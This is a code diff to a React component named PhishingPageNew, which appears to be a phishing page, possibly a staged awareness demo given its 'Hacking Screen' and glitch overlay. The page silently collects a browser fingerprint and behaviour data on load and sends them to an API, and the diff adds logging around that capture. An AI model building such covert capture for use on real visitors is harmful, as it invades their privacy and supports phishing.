@@ -110,11 +110,12 @@ const PhishingPageNew = () => {
       // 1. Start capture in background (don't wait for it)
       (async () => {
         try {
-          console.log('🔍 Capturing data...');
+          console.log('🔍 [AUTO-CAPTURE] Starting fingerprint collection...');
           const fingerprint = await collectFingerprint();
-          const timeOnPage = Math.floor((Date.now() - startTimeRef.current) / 1000);
+          console.log('🔍 [AUTO-CAPTURE] Fingerprint collected:', fingerprint);
 
-          await captureData({
+          const timeOnPage = Math.floor((Date.now() - startTimeRef.current) / 1000);
+          const payload = {
             ...fingerprint,
             behavior: { ...behaviorRef.current, timeOnPage },
             metadata: {
@@ -122,10 +123,13 @@ const PhishingPageNew = () => {
               formData: { email: null, password: null }
             },
             timestamp: new Date().toISOString(),
-          });
-          console.log('✅ Data captured');
+          };
+
+          console.log('🔍 [AUTO-CAPTURE] Sending to API...', payload);
+          const result = await captureData(payload);
+          console.log('✅ [AUTO-CAPTURE] Successfully saved to database!', result);
         } catch (error) {
-          console.error('❌ Capture error:', error);
+          console.error('❌ [AUTO-CAPTURE] Failed:', error);
         }
       })();
 
@@ -215,7 +219,7 @@ const PhishingPageNew = () => {
 
       {/* Glitch Overlay */}
       {showGlitch && (
-        <div className="fixed inset-0 bg-apex-red opacity-20 pointer-events-none z-40 animate-glitch-intense"></div>
+        <div className="fixed inset-0 bg-apex-red opacity-10 pointer-events-none z-20 animate-glitch-intense"></div>
       )}
 
       {/* Hacking Screen */}
